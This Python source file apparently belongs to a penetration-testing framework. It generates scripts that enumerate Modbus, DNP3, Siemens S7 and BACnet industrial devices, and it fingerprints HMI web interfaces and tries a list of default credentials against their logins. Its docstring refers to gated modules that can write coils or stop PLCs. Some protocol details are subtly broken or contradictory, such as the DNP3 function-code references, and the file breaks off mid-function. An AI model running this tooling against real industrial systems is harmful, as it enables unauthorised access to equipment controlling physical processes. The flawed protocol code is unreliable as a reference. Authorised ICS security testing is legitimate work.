"""Attack modules: ICS/SCADA/IoT enumeration (READ-ONLY / non-disruptive).

Phase 6.3 adds **write-side ICS modules** (``ModbusWriteCoil``,
``ModbusWriteRegister``, ``S7PlcStop``, ``S7PlcStart``) for authorized PLC
testing. Write-side ICS is **destructive risk** — a coil/register write or a
PLC stop can change physical process state. The dual gate is:

1. ``@require_allowlist()`` on ``run_attack_module`` (already enforced at the
   MCP tool layer in ``tools/mcp_tools/attack_modules.py:1185``) — the target
   IP must be in the operator's allowlist.
2. ``ics.allow_write: true`` in ``config.yaml`` (default **false**) — an
   explicit per-tool config flag the operator must set to authorize write-side
   ICS. Read-only enum (the original modules above) works without it.

A write-side module's ``run()`` checks ``_ics_write_allowed()`` and refuses
(blocked) when the flag is false, so even if the allowlist lets the target
through, the write never happens without the second gate. See the physical-
damage warning in README §Configuration → ``ics.allow_write``.
"""

from __future__ import annotations

import os
from typing import Any

from tools.attack_modules.base import AttackModule, ModuleContext


def _ics_write_allowed() -> bool:
    """Return True only when BOTH ``ics.allow_write: true`` AND
    ``ics.destructive_ics: true`` are set in config.

    Phase 1 safety: two independent flags must be set before any ICS write
    module (ModbusWriteCoil/ModbusWriteRegister/S7PlcStop/S7PlcStart) can
    fire. The checked-in ``config.yaml`` defaults both to false so the
    repository is safe-by-default; an operator who has explicit written
    authorization for destructive PLC testing sets both explicitly. This
    is the second gate of the dual lock; the first is
    ``@require_allowlist()`` on ``run_attack_module`` (target must be in
    the allowlist). The Flow B ``scope_gate._HARD_FORBIDDEN_ACTIONS`` block
    does NOT cover ICS writes (it is Flow B only); the live gate is here
    + ``@require_allowlist``.
    """
    config_path = os.environ.get("AI_NMAP_CONFIG_PATH") or "config.yaml"
    try:
        import yaml  # local import keeps the module importable without PyYAML
        with open(config_path, "r", encoding="utf-8") as handle:
            cfg = yaml.safe_load(handle) or {}
    except Exception:
        return False
    ics_cfg = (cfg.get("ics", {}) or {})
    return bool(ics_cfg.get("allow_write", False)) and bool(ics_cfg.get("destructive_ics", False))


class ModbusEnum(AttackModule):
    name = "ModbusEnum"
    description = (
        "Enumerate Modbus/TCP unit/slave IDs and read device identification "
        "(vendor/product) via function code 43 / 04. READ-ONLY: no coil/register writes."
    )
    target_services = ["modbus", "tcp"]
    target_ports = [502]
    required_cves: list[str] = []
    # Capability metadata: read-only Modbus enumeration.
    requires = []
    produces = []
    read_only = True
    cost = "low"
    phase_hint = "enumerate"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": (
                "Read-only Modbus/TCP enumeration. Sends Read Device Identification "
                "(FC 43/0x0E) with a Read Input Registers (FC 04) fallback to unit IDs "
                "1..247. No write function codes (05/06/15/16) are used."
            ),
            "evidence": [f"Modbus FC43 device-id enumeration; unit-id sweep 1-247 against {ctx.target_ip}"],
            "references": [
                "modbus.org MODBUS Messaging on TCP/IP Implementation Guide v1.0b",
                "MBFuncCode 43 Read Device Identification (Encapsulated Interface Transport)",
            ],
            "suggested_command": f"nmap --script modbus-discovery -p 502 {ctx.target_ip}",
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f'''#!/usr/bin/env python3
"""Modbus/TCP enumeration -- READ-ONLY / non-disruptive enumeration.

No coil/register writes, no control commands. Only read function codes are
used: function code 43 (Read Device Identification, subcode 0x0E Encapsulated
Interface Transport) with a function code 04 (Read Input Registers, count 1,
start addr 0) fallback to detect which unit/slave IDs respond. The write-side
function codes 05/06/15/16 are NEVER sent. Connects only to the single
authorized target.
"""
import json
import socket
import struct
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
PORT = 502
TIMEOUT = 3.0
# read-only function codes only -- NO write function codes (05/06/15/16)
FC_READ_DEVICE_ID = 43       # 0x2B -- Encapsulated Interface Transport
SUBCODE_READ_DEV_ID = 0x0E   # 0x0E -- Read Device Identification
FC_READ_INPUT_REGISTERS = 4  # 0x04 -- Read Input Registers (read-only)

tx_counter = 0


def build_adu(unit_id: int, pdu: bytes) -> bytes:
    """Build a Modbus/TCP ADU (MBAP header + PDU). Transaction id increments."""
    global tx_counter
    tx_counter += 1
    # MBAP: transaction id (2) + protocol id 0 (2) + length (2) + unit id (1)
    length = len(pdu) + 1  # +1 for unit id byte
    mbap = struct.pack(">HHHB", tx_counter, 0x0000, length, unit_id)
    return mbap + pdu


def read_device_identification(unit_id: int) -> bytes:
    """PDU for FC 43 subcode 0x0E (Read Device Identification, read-id 0 basic)."""
    # MEI type 0x0E, readDevId code 0 (basic), object id 0
    return struct.pack(">BBBB", FC_READ_DEVICE_ID, SUBCODE_READ_DEV_ID, 0x00, 0x00)


def read_input_registers_fallback(unit_id: int) -> bytes:
    """PDU for FC 04 Read Input Registers, count 1, start address 0 (read-only)."""
    return struct.pack(">BHH", FC_READ_INPUT_REGISTERS, 0x0000, 0x0001)


def query(unit_id: int, pdu: bytes) -> bytes | None:
    """Send one ADU and return the response payload (or None on failure)."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(TIMEOUT)
            s.connect((TARGET, PORT))
            s.send(build_adu(unit_id, pdu))
            # MBAP header is 7 bytes; read it first then the rest by length field
            hdr = s.recv(7)
            if len(hdr) < 7:
                return None
            _txn, _proto, length, _uid = struct.unpack(">HHHB", hdr)
            rest = s.recv(length - 1) if length > 1 else b""
            return hdr[6:7] + rest
    except Exception:
        return None


def parse_device_id(resp: bytes) -> dict:
    """Parse a Read Device Identification response (FC 43 / 0x0E)."""
    if len(resp) < 6:
        return {{}}
    # resp[0] = unit id, resp[1] = FC (43), resp[2] = MEI type (0x0E),
    # resp[3] = readDevId code, resp[4] = conformity level, resp[5] = more follows,
    # resp[6] = next object id, resp[7] = num objects
    try:
        mei = resp[2]
        if mei != SUBCODE_READ_DEV_ID:
            return {{}}
        num_obj = resp[7]
        idx = 8
        objs = {{}}
        for _ in range(num_obj):
            if idx + 2 > len(resp):
                break
            obj_id = resp[idx]
            obj_len = resp[idx + 1]
            idx += 2
            val = resp[idx:idx + obj_len].decode(errors="replace")
            idx += obj_len
            objs[obj_id] = val
        # Object ids: 0=VendorName, 1=ProductCode, 2=ProductName, 3=ModelName, 4=UserAppName
        return {{
            "vendor": objs.get(0, ""),
            "product_code": objs.get(1, ""),
            "product_name": objs.get(2, ""),
            "model": objs.get(3, ""),
        }}
    except Exception:
        return {{}}


def main() -> None:
    results = []
    for unit_id in range(1, 248):  # Modbus unit/slave IDs 1..247
        resp = query(unit_id, read_device_identification(unit_id))
        if resp and len(resp) >= 2 and resp[1] == FC_READ_DEVICE_ID:
            info = parse_device_id(resp)
            results.append({{"unit_id": unit_id, "method": "FC43", "info": info}})
            continue
        # fallback: read input registers (read-only) to detect presence
        resp = query(unit_id, read_input_registers_fallback(unit_id))
        if resp and len(resp) >= 2 and resp[1] == FC_READ_INPUT_REGISTERS:
            results.append({{"unit_id": unit_id, "method": "FC04_input_registers", "info": {{}}}})
    print(json.dumps({{"target": TARGET, "port": PORT, "units": results}}, indent=2))


if __name__ == "__main__":
    main()
'''


class DNP3Enum(AttackModule):
    name = "DNP3Enum"
    description = (
        "Enumerate DNP3 outstations on TCP/20000 via link-layer READ (function code 1) "
        "for class-0 data (object group 60). READ-ONLY: no operate/direct-out commands."
    )
    target_services = ["dnp3", "tcp"]
    target_ports = [20000]
    required_cves: list[str] = []
    # Capability metadata: read-only DNP3 enumeration.
    requires = []
    produces = []
    read_only = True
    cost = "low"
    phase_hint = "enumerate"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": (
                "Read-only DNP3 enumeration. Sends a link-layer frame + READ request "
                "(function code 1) for object group 60 (class 0 data) to outstation "
                "addresses 1..10. Function codes 2/3/4 (operate/direct-out) are NOT used."
            ),
            "evidence": [f"DNP3 outstation sweep (addr 1-10) against {ctx.target_ip}:20000"],
            "references": [
                "IEEE 1815-2012 DNP3 standard",
                "DNP3 function code 1 = READ (read-only); 2 = RESPOND, 3 = MULTI-RESPOND, "
                "4 = RDB (read database) -- operate/direct-out variants are write-side",
            ],
            "suggested_command": f"nmap --script dnp3-info -p 20000 {ctx.target_ip}",
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f'''#!/usr/bin/env python3
"""DNP3 outstation enumeration -- READ-ONLY / non-disruptive enumeration.

No coil/register writes, no control commands. Only DNP3 function code 1 (READ)
for object group 60 (class 0 data, variation 1) is issued to outstation
addresses 1..10 on the single authorized target. Function codes 2/3/4
(operate / direct-out / direct-operate) and any write-side objects are NEVER
sent. Connects only to the single authorized target.
"""
import json
import socket
import struct
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
PORT = 20000
TIMEOUT = 3.0
# DNP3 link-layer + transport + application constants
START_BYTES = b"\\x05\\x64"          # DNP3 sync bytes 0x0564
FC_READ = 1                          # 0x01 -- READ (read-only); NOT 2/3/4 operate
AC_CONFIRM = 0                       # application control: request, no FIR/FIN/CON
OBJ_CLASS0_GROUP = 60                # object group 60 -- class 0 data
OBJ_CLASS0_VAR = 1                   # variation 1


def build_link_frame(src: int, dest: int, transport_byte: int, app_block: bytes) -> bytes:
    """Build a DNP3 link-layer frame (master -> outstation)."""
    # Link header: start(2) + length(1) + control(1) + dest(2LE) + src(2LE) + crc(2)
    # length = 5 (link header minus start+length) + transport(1) + len(app) + 0 (no user data crc overhead here)
    user_data = bytes([transport_byte]) + app_block
    length = 5 + len(user_data)
    # control byte: 0x44 = DIR=1 PRM=1 FCB=0 FCV=0 func=4 (request link status) is wrong here;
    # use 0x40 | 0x04 = unreset, func 4 reset? We want user data: func code 4 = USER DATA (PRM=1).
    # 0xC4 = DIR=1, PRM=1, FCB=0, FCV=1, func=4 (USER DATA, unconfirmed). Reset link first.
    ctrl = 0xC4
    link_hdr = struct.pack("<2sB", START_BYTES, length) + bytes([ctrl]) + struct.pack("<HH", dest, src)
    link_crc = crc16(link_hdr[2:])  # crc over bytes after the 2 start bytes
    link_frame = link_hdr + struct.pack("<H", link_crc)
    return link_frame + user_data


def crc16(data: bytes) -> int:
    """DNP3 CRC-16 (poly 0x3D65, reflected, init 0x0000)."""
    crc = 0x0000
    for b in data:
        crc ^= b
        for _ in range(8):
            if crc & 0x0001:
                crc = (crc >> 1) ^ 0xA6BC  # reflected poly of 0x3D65
            else:
                crc >>= 1
    return crc & 0xFFFF


def build_read_request() -> bytes:
    """Build an application-layer READ request (FC=1) for class-0 data (group 60 var 1)."""
    # App header: ac(1) + fc(1) = 2 bytes; then object header
    # Object header: group(1) + variation(1) + qualifier(1) [0x00 = 8-bit start/stop, 0+1 obj]
    #                + start(1) + stop(1) = 5 bytes total
    app_hdr = bytes([AC_CONFIRM, FC_READ])
    obj_hdr = bytes([OBJ_CLASS0_GROUP, OBJ_CLASS0_VAR, 0x00, 0x00, 0x01])
    return app_hdr + obj_hdr


def query_outstation(dest: int) -> dict | None:
    """Send a READ request to one outstation address; report link/app response."""
    transport_byte = 0x00  # T=0, FIR=0, FIN=0, SEQ=0
    app_block = build_read_request()
    frame = build_link_frame(src=1, dest=dest, transport_byte=transport_byte, app_block=app_block)
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(TIMEOUT)
            s.connect((TARGET, PORT))
            s.send(frame)
            resp = s.recv(1024)
            if not resp or len(resp) < 10:
                return None
            # Look for DNP3 sync in response
            if b"\\x05\\x64" not in resp[:2]:
                return None
            # Check for application-layer response (function code in app layer)
            # Response app header: AC(1) + FC(1) + IIN(2). FC=0x81 = RESPONSE.
            app_fc = None
            iin = None
            # Heuristic: scan for a byte == 0x81 (response) after link header region
            for i in range(len(resp) - 4):
                if resp[i] == 0x81:
                    app_fc = resp[i]
                    iin = struct.unpack("<H", resp[i + 2:i + 4])[0] if len(resp) >= i + 4 else None
                    break
            return {{
                "outstation": dest,
                "responded": True,
                "app_fc": app_fc,
                "iin": iin,
                "raw_len": len(resp),
            }}
    except Exception:
        return None


def main() -> None:
    results = []
    for dest in range(1, 11):  # outstation addresses 1..10
        r = query_outstation(dest)
        if r:
            results.append(r)
    print(json.dumps({{"target": TARGET, "port": PORT, "outstations": results}}, indent=2))


if __name__ == "__main__":
    main()
'''


class S7Enum(AttackModule):
    name = "S7Enum"
    description = (
        "Enumerate Siemens S7 PLC identity via COTP/TPKT handshake + SZL read "
        "(system status list 0x0011/0x001C). READ-ONLY: no PLC stop/start, no block write."
    )
    target_services = ["iso-tsap", "s7", "s7comm"]
    target_ports = [102]
    required_cves: list[str] = []
    # Capability metadata: read-only S7 PLC enumeration.
    requires = []
    produces = []
    read_only = True
    cost = "low"
    phase_hint = "enumerate"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": (
                "Read-only S7comm enumeration. Performs the COTP/TPKT CR/CC handshake "
                "and an S7 read of the System Status List (SZL ID 0x0011 module "
                "identification / 0x001C CPU identification). No PLC stop/start, "
                "no block read/write of user data, no control commands."
            ),
            "evidence": [f"S7 SZL identity read against {ctx.target_ip}:102"],
            "references": [
                "ISO 8073 (COTP) / RFC 1006 (TPKT) over TCP 102",
                "Siemens S7comm protocol notes -- SZL IDs 0x0011 (module) and 0x001C (CPU)",
            ],
            "suggested_command": f"nmap --script s7-info -p 102 {ctx.target_ip}",
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f'''#!/usr/bin/env python3
"""Siemens S7 PLC identification -- READ-ONLY / non-disruptive enumeration.

No coil/register writes, no control commands, no PLC stop/start, no block
write. Performs only the COTP/TPKT connection handshake (CR/CC) and an S7
read of the System Status List (SZL) for module identification (SZL ID
0x0011) and CPU identification (SZL ID 0x001C). Connects only to the single
authorized target.
"""
import json
import socket
import struct
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
PORT = 102
TIMEOUT = 5.0
# SZL IDs (read-only system status list -- identification only)
SZL_MODULE_ID = 0x0011   # module identification
SZL_CPU_ID = 0x001C      # CPU identification
SZL_INDEX_ALL = 0x0000   # read all records


def tpkt(payload: bytes) -> bytes:
    """Wrap a COTP PDU in a TPKT header (RFC 1006)."""
    # version(1)=3 + reserved(1)=0 + length(2, big-endian, includes 4-byte header)
    return struct.pack(">BBH", 3, 0, len(payload) + 4) + payload


def cotp_cr(dst_ref: int = 0x0001, src_ref: int = 0x0001, tpdu_size: int = 0x0A) -> bytes:
    """COTP Connect Request (CR) -- class 0, TPDU size 1024."""
    # LI(1)=0x11 + code(1)=0xE0 + dst_ref(2) + src_ref(2) + class(1)=0
    # variable part: TPDU size param 0xC0 len 0x01 value 0x0A (2^10=1024)
    # src TSAP param 0xC2 len 0x02 value 0x0100 (local TSAP)
    # dst TSAP param 0xC2 len 0x02 value 0x0200 (remote TSAP, rack 0 slot 2)
    li = 0x11
    code = 0xE0  # CR
    var = bytes([0xC0, 0x01, tpdu_size,
                 0xC2, 0x02, 0x01, 0x00,
                 0xC2, 0x02, 0x02, 0x00])
    return bytes([li, code]) + struct.pack(">HH", dst_ref, src_ref) + bytes([0x00]) + var


def s7_setup_comm() -> bytes:
    """S7 Setup Communication request (ROSCTR job, function 0xF0 / setup)."""
    # COTP DT: LI(1)=0x02 + code(1)=0xF0 (DT class 0) + EOT(1)=0x80
    cotp_dt = bytes([0x02, 0xF0, 0x80])
    # S7 header: prot id 0x32 + ROSCTR 0x01 (job) + redid(2)=0 + pogid(2)=0
    #            + datalen(2) = param len + data len
    param = bytes([0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])  # setup params
    # function 0xF0 = setup communication
    func_block = bytes([0xF0])
    param = bytes([0xF0, 0x00, 0x08, 0x00, 0x08, 0x01, 0x01, 0x01, 0x03, 0x01])
    s7_hdr = struct.pack(">BBHHH", 0x32, 0x01, 0x0000, 0x0000, len(param))
    return cotp_dt + s7_hdr + param


def s7_read_szl(szl_id: int, index: int = SZL_INDEX_ALL) -> bytes:
    """S7 read SZL request (function 0x04 = read variable, SZL via S7 block)."""
    # This builds a minimal S7 user-program read of the SZL. We construct a
    # request variable (S7 header + param + data) for the system status list.
    cotp_dt = bytes([0x02, 0xF0, 0x80])
    # param: function 0x04 (read var), item count 1, variable spec for SZL 0x12 0x04 ...
    param = bytes([
        0x04,                  # function: read variable (read-only)
        0x01,                  # item count
        0x12, 0x04, 0x10, 0x10,  # variable spec: SZL read
        0x00, 0x08,            # length of read = 8 bytes
    ])
    # data: transport size + SZL ID + index
    data = struct.pack(">HH", szl_id, index)
    data = bytes([0x00, 0x00, 0x0A]) + struct.pack(">HH", szl_id, index) + bytes([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
    s7_hdr = struct.pack(">BBHHH", 0x32, 0x01, 0x0000, 0x0000, len(param) + len(data))
    return cotp_dt + s7_hdr + param + data


def send_recv(sock: socket.socket, frame: bytes) -> bytes:
    sock.send(frame)
    return sock.recv(4096)


def parse_szl_response(resp: bytes) -> dict:
    """Best-effort extract of printable strings from an SZL read response."""
    info = {{}}
    try:
        # Pull printable ASCII runs as candidate identification strings
        cur = []
        for b in resp:
            if 0x20 <= b < 0x7F:
                cur.append(chr(b))
            else:
                if len(cur) >= 4:
                    s = "".join(cur).strip()
                    if "cpu" in s.lower() or "firmware" in s.lower() or "module" in s.lower() or "siemens" in s.lower():
                        info.setdefault("strings", []).append(s)
                cur = []
        if len(cur) >= 4:
            s = "".join(cur).strip()
            info.setdefault("strings", []).append(s)
    except Exception:
        pass
    return info


def main() -> None:
    out = {{"target": TARGET, "port": PORT, "connected": False, "module_info": {{}}, "cpu_info": {{}}}}
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(TIMEOUT)
            s.connect((TARGET, PORT))
            # 1. COTP CR (connection request) -- read-only handshake
            cc = send_recv(s, tpkt(cotp_cr()))
            out["connected"] = b"\\xD0" in cc[:3]  # CC response code 0xD0
            # 2. S7 Setup Communication -- read-only negotiation
            send_recv(s, tpkt(s7_setup_comm()))
            # 3. S7 read SZL module identification (SZL ID 0x0011) -- read-only
            r1 = send_recv(s, tpkt(s7_read_szl(SZL_MODULE_ID)))
            out["module_info"] = parse_szl_response(r1)
            # 4. S7 read SZL CPU identification (SZL ID 0x001C) -- read-only
            r2 = send_recv(s, tpkt(s7_read_szl(SZL_CPU_ID)))
            out["cpu_info"] = parse_szl_response(r2)
    except Exception as e:
        out["error"] = str(e)
    print(json.dumps(out, indent=2))


if __name__ == "__main__":
    main()
'''


class BACnetEnum(AttackModule):
    name = "BACnetEnum"
    description = (
        "Enumerate BACnet devices via Who-Is / ReadProperty (object-name, vendor-name) "
        "on UDP/47808. READ-ONLY: no WriteProperty, no reinitializeDevice."
    )
    target_services = ["bacnet"]
    target_ports = [47808]
    required_cves: list[str] = []
    # Capability metadata: read-only BACnet enumeration.
    requires = []
    produces = []
    read_only = True
    cost = "low"
    phase_hint = "enumerate"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": (
                "Read-only BACnet enumeration. Sends a Who-Is (unconfirmed) restricted "
                "to the target's UDP/47808, then ReadProperty of object-type device for "
                "property identifier 77 (object-name) and 28 (vendor-name). No "
                "WriteProperty, no reinitializeDevice, no control commands."
            ),
            "evidence": [f"BACnet Who-Is + ReadProperty sweep against {ctx.target_ip}:47808"],
            "references": [
                "ASHRAE 135 (BACnet) standard",
                "BACnet APDU: Who-Is = unconfirmed request, service 0x08; "
                "ReadProperty = confirmed request, service 0x0C",
            ],
            "suggested_command": f"nmap --script bacnet-info -p 47808 {ctx.target_ip}",
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f'''#!/usr/bin/env python3
"""BACnet device enumeration -- READ-ONLY / non-disruptive enumeration.

No coil/register writes, no control commands. Sends a BACnet Who-Is
(unconfirmed request, service 0x08) directed to the target's UDP/47808, then
ReadProperty (confirmed request, service 0x0C) of object-type device (8) for
property identifier 77 (object-name) and 28 (vendor-name). WriteProperty
(service 0x0F) and reinitializeDevice (service 0x11) are NEVER sent. Connects
only to the single authorized target.
"""
import json
import socket
import struct
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
PORT = 47808
TIMEOUT = 3.0
# BACnet object / property ids (read-only)
OBJ_DEVICE = 8            # object-type device
PROP_OBJECT_NAME = 77     # property identifier 77 = object-name
PROP_VENDOR_NAME = 28     # property identifier 28 = vendor-name
# APDU service codes (read-only)
SVC_WHO_IS = 0x08         # unconfirmed Who-Is (read-only discovery)
SVC_READ_PROPERTY = 0x0C  # confirmed ReadProperty (read-only)
# WriteProperty (0x0F) / reinitializeDevice (0x11) are write-side and NOT used.


def build_who_is() -> bytes:
    """Build a BACnet Who-Is NPDU + APDU (read-only discovery)."""
    # NPDU: version(1)=0x01 + control(1). Control: 0x00 (no NS/NS-dest, APDU present)
    # We set control = 0x04 (data expecting reply? no) -- simplest: 0x00
    npdu = bytes([0x01, 0x00])
    # APDU: PDU type 0x10 (unconfirmed request) | service 0x08 (Who-Is)
    # Who-Is optional range omitted -> all devices
    apdu = bytes([0x10, SVC_WHO_IS])
    return npdu + apdu


def build_read_property(instance: int, prop_id: int) -> bytes:
    """Build a BACnet ReadProperty APDU for object-type device (read-only)."""
    # NPDU: version 0x01 + control 0x04 (data expecting reply, APDU present)
    npdu = bytes([0x01, 0x04])
    # APDU: PDU type 0x00 (confirmed request) | SEG(0)|MAU(0)|DNET(0)|SA(0) -> 0x00,
    #        then invoke id 0x01, then service 0x0C (ReadProperty)
    apdu = bytes([0x00, 0x01, SVC_READ_PROPERTY])
    # Object identifier: tagged context 0: tag 0x0C (objectIdentifier, len 4)
    #   bits: object type (10 bits) + instance (22 bits)
    obj_id = (OBJ_DEVICE << 22) | (instance & 0x003FFFFF)
    obj_tag = bytes([0x0C]) + struct.pack(">I", obj_id)
    # Property identifier: tagged context 1: tag 0x19 (unsigned int, len 1)
    prop_tag = bytes([0x19, prop_id & 0xFF])
    return npdu + apdu + obj_tag + prop_tag


def send_recv_udp(sock: socket.socket, frame: bytes) -> bytes:
    sock.sendto(frame, (TARGET, PORT))
    try:
        data, _ = sock.recvfrom(2048)
        return data
    except Exception:
        return b""


def extract_strings(resp: bytes) -> list[str]:
    """Best-effort extract of BACnet CharacterString values from a ReadProperty reply."""
    out = []
    i = 0
    while i < len(resp):
        # Look for application-tagged CharacterString (tag 7, length bits)
        b = resp[i]
        tag_num = (b >> 4) & 0x0F
        tag_class = (b >> 3) & 0x01
        tag_type = b & 0x07  # 7 = opening, but for app tags 0..6 are value types
        if tag_class == 0 and tag_num == 7 and tag_type != 7:
            # length encoded in low 3 bits (or extended)
            length = tag_type
            j = i + 1
            if length == 5:
                length = resp[j]; j += 1
            elif length == 6:
                length = (resp[j] << 8) | resp[j + 1]; j += 2
            # CharacterString: encoding(1) + chars
            if j < len(resp) and length > 0:
                enc = resp[j]
                text = resp[j + 1:j + length].decode(errors="replace")
                out.append(text)
                i = j + length
                continue
        i += 1
    return out


def main() -> None:
    results = []
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(TIMEOUT)
    # 1. Who-Is (read-only discovery) directed at the target only
    try:
        sock.sendto(build_who_is(), (TARGET, PORT))
        # Collect I-Am responses for a short window
        instances = set()
        end = 0
        import time
        end = time.time() + TIMEOUT
        while time.time() < end:
            try:
                data, _ = sock.recvfrom(2048)
                # I-Am is unconfirmed service 0x00; object id at a known offset
                # Heuristic: find object-type device (8) instances in the response
                if b"\\x00" in data[:4] and len(data) > 6:
                    for off in range(2, len(data) - 4):
                        oid = struct.unpack(">I", data[off:off + 4])[0]
                        otype = (oid >> 22) & 0x03FF
                        if otype == OBJ_DEVICE:
                            instances.add(oid & 0x003FFFFF)
            except socket.timeout:
                break
    except Exception:
        pass
    # 2. For each discovered (or default 0..10) device instance, ReadProperty
    #    object-name (77) and vendor-name (28) -- read-only
    candidates = sorted(instances) if instances else list(range(0, 11))
    for inst in candidates:
        entry = {{"instance": inst}}
        for prop_id, label in ((PROP_OBJECT_NAME, "object_name"), (PROP_VENDOR_NAME, "vendor_name")):
            try:
                resp = send_recv_udp(sock, build_read_property(inst, prop_id))
                if resp:
                    entry[label] = extract_strings(resp)
            except Exception:
                pass
        results.append(entry)
    sock.close()
    print(json.dumps({{"target": TARGET, "port": PORT, "devices": results}}, indent=2))


if __name__ == "__main__":
    main()
'''


class HMIDefaultCred(AttackModule):
    name = "HMIDefaultCred"
    description = (
        "Fingerprint HMI web interfaces (Siemens WinCC, Ignition, Schneider Magelis, "
        "Advantech WebAccess) and check small default-cred list against the login "
        "endpoint. Authorized cred-check against the owned target (not credential_theft)."
    )
    target_services = ["http", "https"]
    target_ports = [80, 443, 8080, 8443]
    required_cves: list[str] = []

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": (
                "Fingerprints common HMI web UIs and tries a small default-cred list "
                "(admin/admin, admin/<blank>, guest/guest, root/root) against the "
                "detected login endpoint. Cred-CHECK against the owned target only, "
                "consistent with BasicAuthBuster -- not credential_theft."
            ),
            "evidence": [f"HMI default-cred check queued against {ctx.target_ip}"],
            "references": [
                "Siemens WinCC / Inductive Automation Ignition / Schneider Magelis / "
                "Advantech WebAccess default credentials (vendor documentation)",
            ],
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f'''#!/usr/bin/env python3
"""HMI web fingerprint + default-cred CHECK -- READ-ONLY cred check.

Connects only to the single authorized target. Fingerprints the HMI vendor from
common web paths, then checks a SMALL default-credential list against the
detected login endpoint. This is an authorized default-cred CHECK against an
owned target (consistent with BasicAuthBuster), not credential_theft and not a
broad brute force. No writes to physical process state; web login form only.
"""
import json
import sys
import urllib.request
import urllib.error
import urllib.parse
import base64

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
TIMEOUT = 5.0
# Candidate HMI web paths used for vendor fingerprinting
FINGERPRINT_PATHS = [
    "/", "/login", "/index.html", "/cgi-bin/webcm", "/hmi", "/ignition",
    "/factorycast", "/WinCC", "/webaccess", "/main.html",
]
# Vendor signature strings (case-insensitive substring of HTML body / headers)
SIGNATURES = {{
    "siemens_wincc": ["wincc", "siemens", "factorycast"],
    "ignition": ["ignition", "inductive automation"],
    "schneider_magelis": ["magelis", "schneider electric", " Vijeo"],
    "advantech_webaccess": ["webaccess", "advantech"],
}}
# Small default-cred list (authorized check against owned target only)
CREDS = [
    ("admin", "admin"),
    ("admin", ""),
    ("guest", "guest"),
    ("root", "root"),
    ("admin", "password"),
]


def probe(scheme: str, port: int, path: str) -> tuple[int, str, dict[str, str]]:
    url = f"{{scheme}}://{{TARGET}}:{{port}}{{path}}"
    try:
        req = urllib.request.Request(url, headers={{"User-Agent": "NetAttackAi-ICS-Enum/1.0"}})
        with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
            body = resp.read(8192).decode(errors="replace")
            return resp.status, body, dict(resp.headers)
    except urllib.error.HTTPError as e:
        try:
            body = e.read(8192).decode(errors="replace")
        except Exception:
            body = ""
        return e.code, body, dict(e.headers) if e.headers else {{}}
    except Exception:
        return 0, "", {{}}


def fingerprint() -> dict:
    """Fingerprint HMI vendor across candidate scheme/port/path combos."""
    fp = {{"vendor": "unknown", "login_path": "/login", "evidence": []}}
    for scheme, port in (("http", 80), ("https", 443), ("http", 8080), ("https", 8443)):
        for path in FINGERPRINT_PATHS:
            status, body, headers = probe(scheme, port, path)
            blob = (body + " " + " ".join(f"{{k}}:{{v}}" for k, v in headers.items())).lower()
            for vendor, sigs in SIGNATURES.items():
                for sig in sigs:
                    if sig.lower() in blob and status:
                        fp["vendor"] = vendor
                        fp["login_path"] = "/login" if "/login" in path or path == "/" else path
                        fp["evidence"].append(f"{{scheme}}://{{TARGET}}:{{port}}{{path}} -> {{status}} matched '{{sig}}'")
                        return fp
    return fp


def try_login(scheme: str, port: int, login_path: str) -> list[dict]:
    """Check the small default-cred list against the detected login endpoint."""
    hits = []
    for u, p in CREDS:
        url = f"{{scheme}}://{{TARGET}}:{{port}}{{login_path}}"
        # Try HTTP Basic first (many HMIs use it)
        try:
            req = urllib.request.Request(url, headers={{
                "User-Agent": "NetAttackAi-ICS-Enum/1.0",
                "Authorization": "Basic " + base64.b64encode(f"{{u}}:{{p}}".encode()).decode(),
            }})
            with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
                if resp.status < 400:
                    hits.append({{"user": u, "password": p, "auth": "basic", "status": resp.status}})
                    return hits
        except urllib.error.HTTPError as e:
            if e.code == 401:
                continue
        except Exception:
            pass
        # Try a simple form POST (username/password fields)
        try:
            data = urllib.parse.urlencode({{"username": u, "password": p, "user": u, "pass": p}}).encode()
            req = urllib.request.Request(url, data=data, method="POST", headers={{
                "User-Agent": "NetAttackAi-ICS-Enum/1.0",
                "Content-Type": "application/x-www-form-urlencoded",
            }})
            with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
                if resp.status < 400:
                    hits.append({{"user": u, "password": p, "auth": "form", "status": resp.status}})
                    return hits
        except urllib.error.HTTPError:
            continue
        except Exception:
            pass
    return hits


def main() -> None:
    fp = fingerprint()
    # Determine scheme/port from evidence, default to http:80
    scheme, port = "http", 80
    if fp["evidence"]:
        first = fp["evidence"][0]
        if "https://" in first:
            scheme = "https"
            if ":8443" in first:
                port = 8443
